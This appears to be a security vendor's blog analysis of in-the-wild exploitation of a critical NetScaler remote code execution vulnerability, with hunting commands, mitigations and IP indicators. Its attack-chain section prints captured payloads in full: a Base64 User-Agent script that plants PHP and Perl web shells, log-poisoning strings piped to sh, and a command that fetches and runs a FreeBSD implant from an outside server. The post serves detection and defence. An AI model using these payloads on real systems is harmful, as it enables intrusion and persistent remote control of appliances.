---
title: "CVE-2026-88771: NetScaler RCE Exploitation | ThreatLabz"
author: Sai Nikhil Perla; Rishabh Nihalani; Nataraja Gundale
url: https://www.zscaler.com/blogs/security-research/cve-2026-88771-inside-exploitation-critical-netscaler-rce-vulnerability
hostname: zscaler.com
description: ThreatLabz analyzes CVE-2026-88771 exploitation attempts targeting NetScaler, including log poisoning, web shell deployment, and payload delivery.
sitename: Zscaler, Inc.
date: "2026-10-16"
fingerprint: "241b3cdacb3e7689"
---
Zscaler Blog

Get the latest Zscaler blog updates in your inbox

# CVE-2026-88771: Inside the Exploitation of a Critical NetScaler RCE Vulnerability

## Introduction

On September 27, 2026, Citrix disclosed [<u>CVE-2026-88771</u>](https://www.cve.org/CVERecord?id=CVE-2026-88771), a critical remote code execution (RCE) vulnerability affecting NetScaler Application Delivery Controller (ADC) and NetScaler Gateway. The vulnerability carries a CVSS v3.1 score of 9.8 according to [<u>NVD</u>](https://nvd.nist.gov/vuln/detail/cve-2026-88771) and a CVSS v4.0 score of 9.5 according to the [<u>Citrix security bulletin CTX697096</u>](https://support.citrix.com/external/article/CTX697096). The vulnerability allows unauthenticated attackers to execute arbitrary commands on affected appliances. Exploitation requires no optional features to be enabled.

Citrix confirmed exploitation on unmitigated appliances, and the US’s Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-88771 to its [<u>Known Exploited Vulnerabilities catalog</u>](https://www.cisa.gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway) following reports of active exploitation worldwide. Citrix has since disclosed another critical vulnerability affecting NetScaler ADC and NetScaler Gateway, [<u>CVE-2026-107406</u>](https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX697191&articleURL=Citrix_NetScaler_ADC_and_Citrix_NetScaler_Gateway_Security_Bulletin_for_CVE_2026_107406), which can lead to RCE or denial of service. CVE-2026-107406 affects appliances configured as SAML service provider or identity provider depending on the software version. The analysis in this blog focuses on the exploitation of CVE-2026-88771.

Zscaler ThreatLabz observed a staged exploitation chain involving access-log poisoning, remote command execution before authentication, appliance fingerprinting, and attempts to deploy multiple web shells. ThreatLabz also observed delivery of a FreeBSD x64 implant from infrastructure that overlapped with activity we previously associated with exploitation of StyleSmuggler ([<u>CVE-2026-75650</u>](https://www.cve.org/CVERecord?id=CVE-2026-75650)), a vulnerability affecting Adobe Commerce and Magento.

This overlap provides an investigative lead but does not establish threat actor attribution. Shared hosting and compromised infrastructure, malware distribution services, or payload reuse by unrelated operators could explain the connection.

## Fixed Releases

Citrix recommends installing the following builds or later:

- Citrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.46 and later releases
- Citrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.29 and later releases of 13.1
- Citrix NetScaler ADC 14.1-FIPS 14.1-73.46 FIPS and later releases of 14.1-FIPS
- Citrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1.37.283 and later releases of 13.1-FIPS and 13.1-NDcPP

## Recommendations

Organizations running NetScaler ADC or NetScaler Gateway should take the following actions immediately:

- **Identify exposed appliances:** Inventory every NetScaler appliance and determine its software version, build, and internet exposure.
- **Preserve forensic evidence before updating:** Capture a virtual machine snapshot, where applicable, and collect remote syslog data, the NetScaler technical support bundle, and available packet-engine core dumps. CISA warns that updating may remove or reduce forensic visibility.
- **Isolate potentially compromised appliances:** Remove potentially compromised appliances from untrusted networks while preserving evidence.
- **Mitigation and response:** If your environment includes any of the impacted appliances, it is advisable to proactively hunt for signs of compromise. The following commands, sourced from [<u>Sh3llc0de</u>](https://sh3llc0d3.com/blog/inside-the-netscaler-zero-day-siege-chained-pre-auth-rces-weaponized-in-the-wild-watchtowr-disclosure/), can help identify suspicious activity.
To investigate modifications within the FreeBSD shell, access the NetScaler console, enter shell, and run the commands below:

```
#1. Inspect running processes for suspicious shells spawned by nsppe
ps aux | grep -E "sh|bash|python|perl|nc|curl|wget" | grep -v "nsconmsg"
# 2. Check startup script rc.netscaler for unauthorized modifications
cat /flash/nsconfig/rc.netscaler
# 3. Audit cron jobs for suspicious automated scripts
crontab -l
cat /etc/crontab
# 4. Search for newly created or modified web files in webroot directories
find /netscaler/ns_gui/ -type f -mtime -3
find /var/netscaler/gui/ -type f -mtime -3
# 5. Review HTTP error logs for abnormal crash dumps or core files
ls -la /var/crash/
ls -la /var/core/
```
To determine whether any unauthorized child shells have been launched under the `/nobody/` service account, run the following:

```
# Inspect active processes spawned by the nobody service context
ps aux | grep -E "(sh|bash|python|perl|nc)"
# Audit active network listening sockets for unmapped ports
netstat -an | grep LISTEN
```
- **Check configuration integrity:** Compare `/etc/httpd.conf`, any included configuration files, and other appliance configuration files with those on a known-good system. Pay particular attention to unexpected PHP or CGI enablement.
- **Search for known access paths:** Search HTTP access logs for paths/URIs consistent with GET request paths associated with this CVE.
- **Search for staged payloads:** Look for User-Agent values of `INDEX`: followed by Base64-encoded content in HTTP access logs.
- **Search for forged failure messages:** Review authentication and system logs for fabricated `pitboss PPE` messages containing shell syntax.
- **Review outbound connections:** Investigate appliance-initiated connections, especially downloads from unfamiliar IP addresses.
- **Rotate exposed secrets after containment:** If compromise is confirmed, rotate credentials, tokens, certificates, and other secrets stored on or accessible through the appliance.
- **Upgrade to a fixed release:** Install the applicable Citrix build listed above.

## Attack Chain

The figure below illustrates how attackers exploit CVE-2026-88771 to gain initial access to NetScaler appliances.

Figure 1: Attack chain exploiting CVE-2026-88771 to compromise NetScaler appliances.

### Step 1: Staging the payload in the HTTP access log

The attacker sent GET requests to common NetScaler paths, as listed below:

- /logon/LogonPoint/tmindex.html
- /logon/LogonPoint/index.html
- /vpn/index.html
- /logon/tmindex.html

The requests carried a distinctive User-Agent value:

`User-Agent: INDEX:bWtkaXIgLXAgL3Zhci92cG4vYm9va21hcmsvIC9uZXRzY2FsZXIvbnNfZ3VpL3Zwbi8gL3Zhci9uZXRzY2FsZXIvZ3VpL3Zwbi8gL3Zhci92cG4vdGhlbWUvIC92YXIvbmV0c2NhbGVyL2xvZ29uL0xvZ29uUG9pbnQvIC9uZXRzY2FsZXIvbnNfZ3VpL2NnaS87IGVjaG8gIk54LXpEfCQoaWQpfCQodW5hbWUgLWEpfCQoaG9zdG5hbWUpfCQoY2F0IC9ldGMvbnNyZWxlYXNlIDI+L2Rldi9udWxsIHx8IGNhdCAvZXRjL25zY29uZmlnL25zLmNvbmYgMj4vZGV2L251bGwgfCBoZWFkIC0xKSIgPiAvdmFyL3Zwbi9ib29rbWFyay9OeF81OTM2Lmh0bWw7IGVjaG8gIk54LXpEfCQoaWQpfCQodW5hbWUgLWEpfCQoaG9zdG5hbWUpfCQoY2F0IC9ldGMvbnNyZWxlYXNlIDI+L2Rldi9udWxsIHx8IGNhdCAvZXRjL25zY29uZmlnL25zLmNvbmYgMj4vZGV2L251bGwgfCBoZWFkIC0xKSIgPiAvbmV0c2NhbGVyL25zX2d1aS92cG4vTnhfNTkzNi5odG1sOyBlY2hvICJOeC16RHwkKGlkKXwkKHVuYW1lIC1hKXwkKGhvc3RuYW1lKXwkKGNhdCAvZXRjL25zcmVsZWFzZSAyPi9kZXYvbnVsbCB8fCBjYXQgL2V0Yy9uc2NvbmZpZy9ucy5jb25mIDI+L2Rldi9udWxsIHwgaGVhZCAtMSkiID4gL3Zhci9uZXRzY2FsZXIvZ3VpL3Zwbi9OeF81OTM2Lmh0bWw7IGVjaG8gIk54LXpEfCQoaWQpfCQodW5hbWUgLWEpfCQoaG9zdG5hbWUpfCQoY2F0IC9ldGMvbnNyZWxlYXNlIDI+L2Rldi9udWxsIHx8IGNhdCAvZXRjL25zY29uZmlnL25zLmNvbmYgMj4vZGV2L251bGwgfCBoZWFkIC0xKSIgPiAvdmFyL3Zwbi90aGVtZS9OeF81OTM2Lmh0bWw7IGVjaG8gIk54LXpEfCQoaWQpfCQodW5hbWUgLWEpfCQoaG9zdG5hbWUpfCQoY2F0IC9ldGMvbnNyZWxlYXNlIDI+L2Rldi9udWxsIHx8IGNhdCAvZXRjL25zY29uZmlnL25zLmNvbmYgMj4vZGV2L251bGwgfCBoZWFkIC0xKSIgPiAvdmFyL25ldHNjYWxlci9sb2dvbi9Mb2dvblBvaW50L054XzU5MzYuaHRtbDsgZWNobyAnPD9waHAgZWNobyAiTngtekR8Ii5zaGVsbF9leGVjKCRfR0VUWzBdKS4ifCI7ID8+JyA+IC92YXIvdnBuL2Jvb2ttYXJrL054XzU5MzYucGhwOyBjaG1vZCA3NTUgL3Zhci92cG4vYm9va21hcmsvTnhfNTkzNi5waHA7IGVjaG8gJzw/cGhwIGVjaG8gIk54LXpEfCIuc2hlbGxfZXhlYygkX0dFVFswXSkuInwiOyA/PicgPiAvbmV0c2NhbGVyL25zX2d1aS92cG4vTnhfNTkzNi5waHA7IGNobW9kIDc1NSAvbmV0c2NhbGVyL25zX2d1aS92cG4vTnhfNTkzNi5waHA7IGVjaG8gJzw/cGhwIGVjaG8gIk54LXpEfCIuc2hlbGxfZXhlYygkX0dFVFswXSkuInwiOyA/PicgPiAvdmFyL25ldHNjYWxlci9ndWkvdnBuL054XzU5MzYucGhwOyBjaG1vZCA3NTUgL3Zhci9uZXRzY2FsZXIvZ3VpL3Zwbi9OeF81OTM2LnBocDsgZWNobyAnPD9waHAgZWNobyAiTngtekR8Ii5zaGVsbF9leGVjKCRfR0VUWzBdKS4ifCI7ID8+JyA+IC92YXIvdnBuL3RoZW1lL054XzU5MzYucGhwOyBjaG1vZCA3NTUgL3Zhci92cG4vdGhlbWUvTnhfNTkzNi5waHA7IGVjaG8gJzw/cGhwIGVjaG8gIk54LXpEfCIuc2hlbGxfZXhlYygkX0dFVFswXSkuInwiOyA/PicgPiAvdmFyL25ldHNjYWxlci9sb2dvbi9Mb2dvblBvaW50L054XzU5MzYucGhwOyBjaG1vZCA3NTUgL3Zhci9uZXRzY2FsZXIvbG9nb24vTG9nb25Qb2ludC9OeF81OTM2LnBocDsgcHJpbnRmICIjIS91c3IvYmluL3BlcmxcbnByaW50ICJDb250ZW50LVR5cGU6IHRleHQvcGxhaW5cclxuXHJcbiI7cHJpbnQgIk54LXpEfCI7aWYoJEVOVntRVUVSWV9TVFJJTkd9PX4vMD0oLiopLyl7cHJpbnQgYCQxYDt9cHJpbnQgInwiOyIgPiAvbmV0c2NhbGVyL25zX2d1aS9jZ2kvTnhfNTkzNi5wbDsgY2htb2QgNzU1IC9uZXRzY2FsZXIvbnNfZ3VpL2NnaS9OeF81OTM2LnBsOyBwcmludGYgIiMhL3Vzci9iaW4vcGVybFxucHJpbnQgIkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpblxyXG5cclxuIjtwcmludCAiTngtekR8IjtpZigkRU5We1FVRVJZX1NUUklOR309fi8wPSguKikvKXtwcmludCBgJDFgO31wcmludCAifCI7IiA+IC92YXIvdnBuL2Jvb2ttYXJrL054XzU5MzYucGw7IGNobW9kIDc1NSAvdmFyL3Zwbi9ib29rbWFyay9OeF81OTM2LnBsOyBwcmludGYgIiMhL3Vzci9iaW4vcGVybFxucHJpbnQgIkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpblxyXG5cclxuIjtwcmludCAiTngtekR8IjtpZigkRU5We1FVRVJZX1NUUklOR309fi8wPSguKikvKXtwcmludCBgJDFgO31wcmludCAifCI7IiA+IC9uZXRzY2FsZXIvbnNfZ3VpL3Zwbi9OeF81OTM2LnBsOyBjaG1vZCA3NTUgL25ldHNjYWxlci9uc19ndWkvdnBuL054XzU5MzYucGw7IHByaW50ZiAiIyEvdXNyL2Jpbi9wZXJsXG5wcmludCAiQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluXHJcblxyXG4iO3ByaW50ICJOeC16RHwiO2lmKCRFTlZ7UVVFUllfU1RSSU5HfT1+LzA9KC4qKS8pe3ByaW50IGAkMWA7fXByaW50ICJ8IjsiID4gL3Zhci9uZXRzY2FsZXIvZ3VpL3Zwbi9OeF81OTM2LnBsOyBjaG1vZCA3NTUgL3Zhci9uZXRzY2FsZXIvZ3VpL3Zwbi9OeF81OTM2LnBsOyBwcmludGYgIiMhL3Vzci9iaW4vcGVybFxucHJpbnQgIkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpblxyXG5cclxuIjtwcmludCAiTngtekR8IjtpZigkRU5We1FVRVJZX1NUUklOR309fi8wPSguKikvKXtwcmludCBgJDFgO31wcmludCAifCI7IiA+IC92YXIvdnBuL3RoZW1lL054XzU5MzYucGw7IGNobW9kIDc1NSAvdmFyL3Zwbi90aGVtZS9OeF81OTM2LnBsOyBwcmludGYgIiMhL3Vzci9iaW4vcGVybFxucHJpbnQgIkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpblxyXG5cclxuIjtwcmludCAiTngtekR8IjtpZigkRU5We1FVRVJZX1NUUklOR309fi8wPSguKikvKXtwcmludCBgJDFgO31wcmludCAifCI7IiA+IC92YXIvbmV0c2NhbGVyL2xvZ29uL0xvZ29uUG9pbnQvTnhfNTkzNi5wbDsgY2htb2QgNzU1IC92YXIvbmV0c2NhbGVyL2xvZ29uL0xvZ29uUG9pbnQvTnhfNTkzNi5wbDsgc2VkIC1pICcnICdzL3BocF9lbmdpbmUgb2ZmL3BocF9lbmdpbmUgb24vZycgL2V0Yy9odHRwZC5jb25mIDI+L2Rldi9udWxsOyBncmVwIC1xICdBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLnBsJyAvZXRjL2h0dHBkLmNvbmYgfHwgZWNobyAnQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5wbCcgPj4gL2V0Yy9odHRwZC5jb25mIDI+L2Rldi9udWxsOyBraWxsIC1IVVAgJChjYXQgL3Zhci9ydW4vaHR0cGQucGlkIDI+L2Rldi9udWxsKSAyPi9kZXYvbnVsbA==`
Decoded Base64 payload:

```
mkdir -p /var/vpn/bookmark/ /netscaler/ns_gui/vpn/ /var/netscaler/gui/vpn/ /var/netscaler/logon/LogonPoint/ /var/vpn/theme/ /var/netscaler/gui/admin_ui/apex/;
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/vpn/bookmark/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /netscaler/ns_gui/vpn/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/netscaler/gui/vpn/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/netscaler/logon/LogonPoint/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/vpn/theme/Nx_7508.html; 
echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/netscaler/gui/admin_ui/apex/Nx_7508.html; 
echo '' > /var/vpn/bookmark/Nx_7508.php; chmod 755 /var/vpn/bookmark/Nx_7508.php; 
echo '' > /netscaler/ns_gui/vpn/Nx_7508.php; chmod 755 /netscaler/ns_gui/vpn/Nx_7508.php; 
echo '' > /var/netscaler/gui/vpn/Nx_7508.php; chmod 755 /var/netscaler/gui/vpn/Nx_7508.php; 
echo '' > /var/netscaler/logon/LogonPoint/Nx_7508.php; chmod 755 /var/netscaler/logon/LogonPoint/Nx_7508.php; 
echo '' > /var/vpn/theme/Nx_7508.php; chmod 755 /var/vpn/theme/Nx_7508.php; 
echo '' > /var/netscaler/gui/admin_ui/apex/Nx_7508.php; chmod 755 /var/netscaler/gui/admin_ui/apex/Nx_7508.php; 
printf "#!/usr/bin/perl\nprint "Content-Type: text/plain\r\n\r\n";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/vpn/bookmark/Nx_7508.pl; chmod 755 /var/vpn/bookmark/Nx_7508.pl; 
printf "#!/usr/bin/perl\nprint "Content-Type: text/plain\r\n\r\n";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /netscaler/ns_gui/vpn/Nx_7508.pl; chmod 755 /netscaler/ns_gui/vpn/Nx_7508.pl; 
printf "#!/usr/bin/perl\nprint "Content-Type: text/plain\r\n\r\n";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/netscaler/gui/vpn/Nx_7508.pl; chmod 755 /var/netscaler/gui/vpn/Nx_7508.pl; 
printf "#!/usr/bin/perl\nprint "Content-Type: text/plain\r\n\r\n";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/netscaler/logon/LogonPoint/Nx_7508.pl; chmod 755 /var/netscaler/logon/LogonPoint/Nx_7508.pl; 
printf "#!/usr/bin/perl\nprint "Content-Type: text/plain\r\n\r\n";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/vpn/theme/Nx_7508.pl; chmod 755 /var/vpn/theme/Nx_7508.pl; 
printf "#!/usr/bin/perl\nprint "Content-Type: text/plain\r\n\r\n";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/netscaler/gui/admin_ui/apex/Nx_7508.pl; chmod 755 /var/netscaler/gui/admin_ui/apex/Nx_7508.pl; 
# Enable PHP + Perl CGI, reload Apache
sed -i '' 's/php_engine off/php_engine on/g' /etc/httpd.conf;
grep -q 'AddHandler cgi-script .pl' /etc/httpd.conf || echo 'AddHandler cgi-script .pl' >> /etc/httpd.conf;
kill -HUP $(cat /var/run/httpd.pid)
```
The same Base64-encoded payload in the User-Agent field was sent to multiple paths. This increased the likelihood that it would be written to the HTTP access log file and remain available when the trigger executed.

At this stage, the payload in the User-Agent value was not executed. Instead, the log served as storage for the attacker-controlled payload.

### Step 2: Poisoning the authentication log

The attacker then sent POST requests to the following authentication endpoints, as observed by ThreatLabz:

```
/nf/auth/doAuthentication.do
/cgi/login
```
The attacker-controlled login value impersonated a NetScaler Packet Processing Engine (PPE) failure record. ThreatLabz observed two variants:

**Variant 1:**

```
pitboss PPE missed too many 
heartbeatsNSPPE;grep${IFS}INDEX:${IFS}/var/log/htt*|
  sed${IFS}'s/.*INDEX://;s/".*//'|b64decode${IFS}-r|sh; X
```
**Variant 2:**

```
pitboss PPE unexpectedly died NSPPE;grep${IFS}INDEX:${IFS}/var/log/htt*|
  sed${IFS}'s/.*INDEX://;s/".*//'|b64decode${IFS}-r|sh;# X
```
Shell commands appended to the forged failure text were designed to instruct the appliance to search HTTP access logs for the `INDEX`: marker, extract the Base64-encoded data, decode it, and pass the result to a command interpreter to execute.

Several variants used `${IFS}` (Internal Field Separator, which in bash can represent a space, tab, or newline character) in place of literal spaces. This preserved separation between command arguments while avoiding spaces that might be transformed or rejected during request processing.


### Inline exploitation variants

In addition to the staged Base64-encoded payload, ThreatLabz captured a shorter inline variant in the `login` parameter.

**Inline variant 1:**

```
pitboss PPE unexpectedly died NSPPE;mkdir${IFS}-p${IFS}/var/vpn/bookmark/${IFS}
  /netscaler/ns_gui/vpn/;echo${IFS}"Nx-zD|$(id)|$(hostname)">/var/vpn/bookmark/Nx_7508.html;
  echo${IFS}''
  >/var/vpn/bookmark/Nx_7508.php;sed${{IFS}}-i${{IFS}}''${{IFS}}
  's/php_engine${{IFS}}off/php_engine${{IFS}}on/g'${{IFS}}/etc/httpd.conf;# X
```
This variant attempted to:

1. Create web-accessible directories.
2. Write the `Nx_7508.html` fingerprint file.
3. Install the `Nx_7508.php` web shell.
4. Enable PHP by modifying `/etc/httpd.conf`.

**Inline variant 2:**

`pitboss PPE unexpectedly died NSPPE;fetch${IFS}-o${IFS}/var/kw2s11${IFS}http://209.141.43[.]95/files/kw2-freebsd-x64-s11;chmod${IFS}+x${IFS}/var/kw2s11;/var/kw2s11;# X`
The command was designed to download a Rust-based 64-bit FreeBSD binary to `/var/kw2s11`, grant executable permissions, and run it.

ThreatLabz identified the same download server in activity associated with exploitation of CVE-2026-75650, tracked as StyleSmuggler.

CVE-2026-75650 is an unauthenticated template-engine injection vulnerability affecting Adobe Commerce and Magento Open Source. Adobe assigned it a CVSS v3.1 score of 10.0 and confirmed exploitation in the wild in security bulletin [<u>APSB26-146</u>](https://helpx.adobe.com/security/products/magento/apsb26-146.html).

The shared download infrastructure is notable because the two vulnerabilities target different platforms:

- CVE-2026-75650 affects Adobe Commerce and Magento Open Source systems.
- CVE-2026-88771 affects Citrix NetScaler ADC and Gateway appliances.

This overlap raises the possibility that one operator or malware-distribution service maintained payloads for different platforms and opportunistically deployed them through vulnerabilities affecting internet-facing systems.

ThreatLabz also observed a burst of exploitation attempts from at least 26 source IP addresses over approximately six to seven minutes. These attempts followed the same log-poisoning and FreeBSD payload-delivery sequence.

Each source IP address sent a login request containing:

1. A forged `pitboss PPE` failure string intended to poison the NetScaler log.
2. A downloader designed to download and execute the 64-bit FreeBSD payload `kw2-freebsd-x64-s11`.

### Step 3: Delayed execution by a privileged script

The poisoned authentication data was written to `/var/log/ns.log`. The vulnerability is triggered when the legitimate NetScaler Perl script, `/netscaler/ns_monuploadd_err.pl`, processes Packet Processing Engine (PPE) failure records as part of the appliance’s diagnostic and core-file handling.

Public analysis found that the script searches `/var/log/ns.log`, rotated NetScaler logs, and `/var/log/messages` for phrases such as:

- PPE missed too many heartbeats
- PPE unexpectedly died

The vulnerable Perl script incorporates part of the selected record into a shell command without properly escaping attacker-controlled shell metacharacters. If the script selects the forged record, the appended command executes with the script’s privileges.

CERT-EU reported that the script selects the last matching record. This may explain why attackers repeatedly submit the trigger. They are attempting to ensure that their poisoned entry remains the most recent matching line when the maintenance script runs.

## Conclusion

CVE-2026-88771 enables unauthenticated remote command execution on Citrix NetScaler by exploiting the appliance’s logging and diagnostic processes. ThreatLabz captured exploitation attempts involving log poisoning, payload spraying across multiple URLs, directory creation, PHP enablement, and inline payload delivery.

## How Zscaler can Help

Zscaler’s [<u>cloud native Zero Trust network access</u>](https://www.zscaler.com/products-and-solutions/zscaler-private-access) (ZTNA) solution gives users fast, secure access to private apps for all users, from any location. Reduce your attack surface and the risk of lateral threat movement—no more internet-exposed remote access IP addresses, and secure inside-out brokered connections. Easy to deploy and enforce consistent security policies across campus and remote users.

[<u>Zscaler Private Access</u>](https://www.zscaler.com/products-and-solutions/zscaler-private-access)™ (ZPA) allows organizations to secure private app access from anywhere. Connect users to apps, never the network, with AI-powered user-to-app segmentation. Prevent lateral threat movement with inside-out connections.

- Deploy comprehensive cyberthreat and data protection for private apps with integrated application protection, deception, and data protection.

The following table shows the typical attack stages and the mitigations recommended by Zscaler.

| **Attack Stage** | **Recommended Mitigation** | 
| **Minimize the external attack surface** | Eliminate externally exposed legacy assets like VPNs and firewalls which are often subject to these zero-day exploitation attempts by leveraging a Zero Trust architecture. | 
| **Prevent compromise** | Detonate unknown second-stage payloads with [<u>Advanced Cloud Sandbox</u>](https://www.zscaler.com/products-and-solutions/cloud-sandbox). Route server egress through [<u>ZIA</u>](https://www.zscaler.com/products-and-solutions/zscaler-internet-access) to detect/block post-compromise activity. Enable [<u>SSL/TLS</u>](https://www.zscaler.com/products-and-solutions/ssl-inspection) inspection for all traffic, including trusted sources. Enable [<u>Advanced Threat Protection</u>](https://www.zscaler.com/products-and-solutions/advanced-threat-protection) to block known C2 domains. Use [<u>Advanced Cloud Firewall</u>](https://www.zscaler.com/products-and-solutions/cloud-firewall), to extend C2 controls across all ports/protocols, including emerging C2. | 
| **Prevent lateral threat movement** | Use [<u>ZPA</u>](https://www.zscaler.com/products-and-solutions/zscaler-private-access) to enforce least-privilege user-to-app segmentation for crown-jewel apps (employees and third parties). Use [<u>ZPA</u>](https://www.zscaler.com/products-and-solutions/zscaler-private-access) inline inspection to block exploitation attempts against private apps from compromised users. Use [<u>Zscaler Deception</u>](https://www.zscaler.com/products-and-solutions/deception-technology) to detect and contain lateral movement or privilege escalation with decoy assets and accounts. | 
| **Prevent data loss** | Inspect outbound traffic across channels with [<u>Zscaler DLP</u>](https://www.zscaler.com/products-and-solutions/data-loss-prevention). | 


## Zscaler Coverage

The Zscaler ThreatLabz team has deployed protection for CVE-2026-88771 with the following:

**Zscaler Advanced Threat Protection**

**Zscaler Private Access AppProtection**

## Indicators of Compromise (IOCs)

### Potential network indicators


| **Source IPs** | 
| 45.153.212\[.\]101 | 
| 46.233.40\[.\]20 | 
| 46.236.167\[.\]143 | 
| 46.33.33\[.\]95 | 
| 49.150.197\[.\]119 | 
| 78.190.152\[.\]64 | 
| 81.10.79\[.\]197 | 
| 82.167.14\[.\]7 | 
| 95.105.74\[.\]172 | 
| 100.38.125\[.\]66 | 
| 102.213.132\[.\]123 | 
| 102.222.146\[.\]45 | 
| 103.181.212\[.\]245 | 
| 103.197.249\[.\]161 | 
| 103.83.146\[.\]100 | 
| 111.92.128\[.\]89 | 
| 114.145.49\[.\]215 | 
| 120.244.160\[.\]182 | 
| 125.62.88\[.\]26 | 
| 130.12.182\[.\]7 | 
| 154.183.158\[.\]198 | 
| 154.241.254\[.\]9 | 
| 174.60.63\[.\]37 | 
| 177.52.203\[.\]23 | 
| 183.63.88\[.\]227 | 
| 190.117.56\[.\]56 | 
| 195.62.37\[.\]119 | 
| 207.48.184\[.\]10 | 

## Was this post useful?

Disclaimer: This blog post has been created by Zscaler for informational purposes only and is provided "as is" without any guarantees of accuracy, completeness or reliability. Zscaler assumes no responsibility for any errors or omissions or for any actions taken based on the information provided. Any third-party websites or resources linked in this blog post are provided for convenience only, and Zscaler is not responsible for their content or practices. All content is subject to change without notice. By accessing this blog, you agree to these terms and acknowledge your sole responsibility to verify and use the information as appropriate for your needs.

## Get the latest Zscaler blog updates in your inbox

By submitting the form, you are agreeing to our [privacy policy](https://www.zscaler.com/privacy-compliance/company-privacy-policy).
